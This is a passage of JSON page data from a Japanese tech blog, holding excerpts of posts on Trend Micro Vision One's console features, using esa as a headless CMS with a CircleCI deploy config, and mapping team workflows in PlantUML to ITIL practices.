AccessZero Trust Secure Access \n\n各種アクセス制御を管理します。    function description     Secure Access Overview -   Secure Access Rules IAM、ログイン制御   Access Control History -   Private Access Configuration プライベートアクセス制御   Internet Access Configuration インターネットアクセス制御     > Response ManagementResponse Management \n\n応答サービスを管理するものだと思いますが、XDR（EDR）との区別がよく分かりません。    function description     Response Management      > Mobile SecurityMobile Security \n\nモバイル端末に特化したセキュリティ機能、検出ログや管理ポリシーを扱います。EMM連携も可能です。    function description     Mobile Detection Logs モバイル端末検出ログ   Mobile Policy モバイル端末管理ポリシー   Risky Mobile Apps MDMとの統合機能     > Inventory ManagementInventory Management \n\n各種リソースの一覧表になります。    function description     Endpoint Inventory エンドポイント端末一覧表   Email Account Inventory Eメールアカウント一覧表   Network Inventory ネットワーク一覧表   Service Gateway Inventory サービスゲートウェイ一覧表   Mobile Inventory モバイル端末一覧表     > WRAPUPWRAPUP \n\nTrend Micro Vision Oneについて、各機能の使い勝手は分かりませんが、EDRを軸にセキュリティ機能を固めているようです。EDRについては完全自動化というのは無理でしょうから、どのくらいサポートがあるかで製品の価値がかわってくるものと思います。Log4Shell診断ツールの使い勝手は分かりましたが、コンソール画面上の他の機能を見る限りどの程度便利かはよく分かりませんでした。"},"name":"[2022-01-01]Trend Micro Vision Oneを試してみる","tags":["security"],"childPublishedDate":{"published_on":"2022-01-01T00:00:00.000Z","published_on_unix":1640995200}}},{"node":{"number":67,"relative_category":"blog/frontend","fields":{"title":"esaをHeadless CMSとして使う","excerpt":"最近仕事の同僚からHeadless CMS という言葉を聞いていて「自分には関係ないな」と距離を取っていたのですが、なぜか回り回って自分からHeadless CMSを作ることになりました。世の中何が起きるか分からないですね。  > PROBLEMPROBLEM \n\n- ブログを普段書かない人なのだが、よそ向けに情報発信する必要が出てきた とは言っても、今までMarkdownをJekyllで管理していたので画像を貼り付けるのが手間でモチベーションが大きく下がっていた さらにPlantUMLを出力するのも手間、試行錯誤した末にいずれも付け焼き刃で、esaの操作感に勝てるものはなかった \n- とは言っても、今までMarkdownをJekyllで管理していたので画像を貼り付けるのが手間でモチベーションが大きく下がっていた さらにPlantUMLを出力するのも手間、試行錯誤した末にいずれも付け焼き刃で、esaの操作感に勝てるものはなかった \n- さらにPlantUMLを出力するのも手間、試行錯誤した末にいずれも付け焼き刃で、esaの操作感に勝てるものはなかった  > SOLUTIONSOLUTION \n\nというわけで、esaをHeadless CMSとして使うことにしました。 \n\nやってることは昔のMovableTypeそのもので懐かしかったです。コンテンツを別システムで管理しビルドサーバーに当該コンテンツを流し込みリビルド、最後にホストサーバーにアップロードというワークフロー。今はJAMStackの文脈で語られているようです。 \n\nこのHeadless CMSが昔と違うのはコンテンツ作成に集中できること。CI周りが発達したので一度ワークフローを組み立てれば後は自動でコンテンツを生成できます。  > やり方やり方 \n\n- esa.io でゆるふわ情報共有 - Middleman Blog への Export サンプル付き #esa_io - Qiita\n- 技術ブログを支える技術（Gatsby + esaio） - mottox2 blog\n- Next.jsとesaを使った個人サイト構築 | corocn.dev \n\nそれほど時間をかけられなかったので、上記3記事の中で手軽さを考慮しmottox2さんのソースコードを拝借しました。ありがとうございます。 \n\n- 作ったレポジトリ：nabinno/nabinno.github.io: On Blahfe - Nab's Github Pages  > シークエンス図シークエンス図 \n\n私が手を入れたのはコンポーネントを削りGatsby Blog Starterに寄せたのと、デプロイ方法を使い慣れたCircleCIに変えたくらいです。 \n\nGitHub PagesにはVercelのような便利なWebhookがないので、esaで実装されたGitHub Webhook連携を使いそれをトリガーにCircleCIジョブを走らせています。 \n\n  > CircleCIジョブCircleCIジョブ \n\nまた、CircleCIジョブは何の変哲もないもので、NodeJSを叩いてGitプッシュしているくらいです。先ほどのGitHub Webhookと似た感じの泥臭いワークフローは [skip ci] コメントの追加があります。当該コメントを入れないとジョブが再帰的に走り続けるので出口で明示してあります。 yml\n\nversion: 2.1 jobs: build_deploy: docker: - image: circleci/node:12.4 steps: - checkout - run: name: Install NPM command: npm install - run: name: Build command: npm run clean && npm run build - add_ssh_keys: fingerprints: - \"{foo}\" - deploy: name: Deploy command: | git config --global user.email \"nab+circleci@blahfe.com\" git config --global user.name \"nabinno+circleci\" git add . git commit -m \"[skip ci]Run npm run clean && npm run build.\" git push origin master workflows: build_deploy: jobs: - build_deploy: filters: branches: only: master   > WRAPUPWRAPUP \n\nとまあ大した作業内容ではないのですが、久しぶりに昔懐かしのMovableTypeのリビルドを思い出しつつ、副産物として全く縁遠かったNetlifyとVercelの位置づけを薄らと感じ取れました。"},"name":"[2021-01-18]esaをHeadless CMSとして使う","tags":["gatsby","esa","headless-cms","cms"],"childPublishedDate":{"published_on":"2021-01-18T00:00:00.000Z","published_on_unix":1610928000}}},{"node":{"number":44,"relative_category":"blog/organization","fields":{"title":"整理したい私はITILをかぶる、PlantUMLへの愛","excerpt":"現在ネクイノでエンジニアリングマネージャー、バックエンドエンジニア、インフラエンジニアを担当しています。入社後8ヶ月、年の瀬ということで振り返り記事を書くことにしました。テーマを一つに絞らないと記事にならないので今回はPlantUMLに絞ります。断りとして、この記事で書いてあることはITILプラクティスを一部なぞっているに過ぎません。PlantUMLが全知全能のツールということを主張したいわけではないです、ただ愛しています。   > PROBLEMPROBLEM \n\n- 開発人数が増えるにあたり、チームとして機能していない 管理規程はあるものの 業務フローが明示化されておらず、誰が何を何の目的で業務を回しているか分からない 可視化されていないプロセスが問題になるケースが増えてきた \n- 管理規程はあるものの 業務フローが明示化されておらず、誰が何を何の目的で業務を回しているか分からない 可視化されていないプロセスが問題になるケースが増えてきた \n- 可視化されていないプロセスが問題になるケースが増えてきた  > SOLUTIONSOLUTION \n\nと言うわけで、入社早々PlantUMLで業務フローを可視化することを始めました。  > PlantUMLとはPlantUMLとは \n\nPlantUMLはオープンソースのUMLダイアグラム作成用のテキストベースの言語です。シークエンス図、ユースケース図、アクティビティ図、クラス図のようなダイアグラムをシンプルで直感的に書くことができます。 \n\n2009年リリースされており、私が使うようになったのは、Emacsのorg-babelで実装されてからなので2014年くらい1。2016-7年にesa.ioやVS Code等で実装されてから爆発的に普及したと記憶しています。「esa.ioはオンラインのorg-modeになるべくPlantUMLを実装すべき」と要望したのは良い思い出です。  > やったことやったこと \n\nさて、私はネクイノに入社早々既存システムの運用開発と情シス（業務運用）の部長職にアサインされました。既存システムの運用開発は新しく外部のパートナーが入ると言うことで、開発フローが大きく変わる節目にありました。  > 開発フローを整備する開発フローを整備する \n\n話を聞くに新しく入る外部パートナーはプロジェクトマネージャ、ブリッジエンジニア・コミュニケーター、モバイルエンジニア、バックエンドエンジニア、フロントエンジニア、品質チェック含め20名程の体制でした。また、既存システムの運用開発ではプロダクトマネジャー、プロダクトオーナーが各開発者とともに企画策定を行うことが慣習として存在していました。私はまず企画から実装、レビュー、リリースまでの流れを整理します。 Jira上の大まかな流れ \n\n 開発の流れ \n\n  > 要望フローを整備する要望フローを整備する \n\n次に、機能要望、バグ報告、改善要望がSlackチャンネルの至る所に散在している上、チケット化されないケースがありました。突貫ではありますが、GoogleフォームとJira連携を行いました2。 \n\nプロダクトマネジャーの体制が整備されてからは、機能要望のフォームは使われることはなくなりましたが、バグ報告、改善要望は要所要所で使われ、トリアージという形で定期的に活用されています。 \n\n  > デプロイフローを整備するデプロイフローを整備する \n\n開発が進んでいくと、今度は開発環境が足りなくなりました。当時はステージング環境と本番環境しかなく、かつ、ステージング環境がテスト環境兼デモ環境の役割を呈しており、ステージング環境おテストで不具合を起こすとデモに影響が出るという状態が続いておりました。また、外部パートナーが開発するに当たり繊細なステージング環境を使うのが難しいため進捗に影響が出始めておりました。 \n\n急を要する事態のためAWS CDKでステージング環境とは別に結合環境を用意し3、デプロイフローを整備しました。 \n\n  > 障害対応フローを整備する障害対応フローを整備する \n\nさて、運用開発が順調に進んでいくと、今度は障害が頻繁に起きていることに気づきました。いいえ、薄々気づいていたのですが多忙にかまけて蓋をしておりました。ここに関しては本腰を入れてAWSサポートプランをビジネスに変更し原因を突き止めました。協力いただいた各位には感謝です。 \n\nまた、今まで見過ごされていたGoogle Workspace等の業務運用のシステムも含め障害報告の体制を敷くとともに、監視体制も強化しました。 \n\n  > 業務フローを整理する業務フローを整理する \n\nまだまだあります。業務内容に関しては詳細は書けませんが、部内の業務から他部署の業務まで安全に生産性を高めるため整理を行いました。まだまだ行います。  > リモート飲みのフローを整備するリモート飲みのフローを整備する \n\nいよいよ疲れてきたのでお酒が飲みたくなりました。飲み会フローを作ってみましたが思いの外手間がかかることが分かりあまり活用できておりません。その代わり社内でオンラインシャッフルランチという制度ができました。 \n\n  > 分かったこと分かったこと \n\nはい、こうして振り返ると入社時に感じていた雑然さは業務フローが明確でない状態のことでした。開発者なら分かると思いますが、企画段階で思い描く構成図は実装する段になるとあまり意味をなさず、結局は頭の中はシークエンス図でいっぱいになります。それと同じで、登場人物、登場人物間のメッセージ、メッセージの大枠が関係者に共有されていないと、いくらリソースが投下されても不安定で生産性に伸び悩むのです。つまり、雑然とした環境を整理すると言うことはシークエンス図を書くことに他なりません。 \n\nしかしながら、当該環境一つ一つを俯瞰的に見るとITILプラクティスそのものであることにも気づきます。 \n\nITILとはITサービスマネジメントのベストプラクティスフレームワークのこと。何らかの高い技術を持っていても、投資対効果を考えていなければ赤字になりビジネスと成り立ちませんし、顧客のことを考えずに作ったものに価値はありませんし、サービスの評価を落とすことになります。このようなことを防ぐには顧客目線やビジネス的な観点が必要で、そのノウハウがまとまったものがITILです。  > 今回対応したプラクティス今回対応したプラクティス \n\n今回の振り返りでは具体的に次のプラクティスをなぞっておりました。    振り返り ITILプラクティス     開発フローを整備する 継続的サービス改善   要望フローを整備する 要求管理、問題管理   デプロイフローを整備する リリース管理及び展開管理   障害対応フローを整備する インシデント管理   業務フローを整理する CMMI   リモート飲みのフローを整備する 組織変更管理    \n\nCMMIと組織変更管理が分かりづらいの少し補足します。 \n\n- CMMIとは能力成熟度モデル統合のことで、業務フローを評価し5段階で成熟度レベルを出す手法です。現状はレベル1-2（初期段階）のものがほとんどなのでまずはPlantUMLを使い共通認識を作るところから始めました。\n- 組織変更管理とは経営学で言うところのチェンジマネジメントに当たります。ここでは各種フローを整備しメンバー全員に落とし込むことを目指します。『Fearless Change』では今回のリモート飲み以外にも多くのパターンランゲージが紹介されています。  > WRAPUPWRAPUP  > 次にすること次にすること \n\nネクストアクションですが、採用フローを考えています。 \n\n（読者の皆様はどんなシークエンス図を思い浮かべましたか?） \n\nというわけで、ネクイノはPlantUMLを愛している開発者を募集中です。  > PR__colon__ ネクイノとはPR: ネクイノとは \n\n「世界中の医療空間と体験を再定義する」をミッションに、人々と医療の間にICTのチカラで橋をかける遠隔医療ソリューションを手掛けている会社です。医療というと高齢の患者さんをイメージされるかもしれませんが、我らがターゲットとしているのは現役世代の方。病気を治療するというより、現役世代がQOLを高めるためのサポートを目的としています。 \n\nメインサービスは、女性に特化したピルのオンライン診療アプリ「スマルナ」。ピルを飲まれている人だけでなく、受診や服用に抵抗がある方にも気軽に利用していただけたらと思いサービス提供しています。診察室の手前に助産師と薬剤師を配置した相談室を設ける等、受診のハードルを下げる工夫をそこかしこに施しているのが特徴です。 \n\n様々なメディカルコミュニケーションを行っています - 専門家相談 - カスタマーサポート - ユーザーコミュニティ  \n\n妻からは「10年前にサービスがあったら良かったのに」とお墨付きをいただいており、興味をもった方は詳しくはこちらをご覧下さい。 https://smaluna.com/  \n\n1. [B! plantuml] nabinnoのブックマーク ↩ \n2. https://github.com/nabinno/google-forms-to-jira-slack ↩ \n3. CDKはaws-rails-provisionerを参考に ecs_patterns.ApplicationLoadBalancedFargateService を実装しました ↩"},"name":"[2020-12-30]整理したい私はITILをかぶる、PlantUMLへの愛","tags":["team-building"],"childPublishedDate":{"published_on":"2020-12-30T00:00:00.000Z","published_on_unix":1609286400}}}]}},"pageContext":{"number":49}},"staticQueryHashes":[]}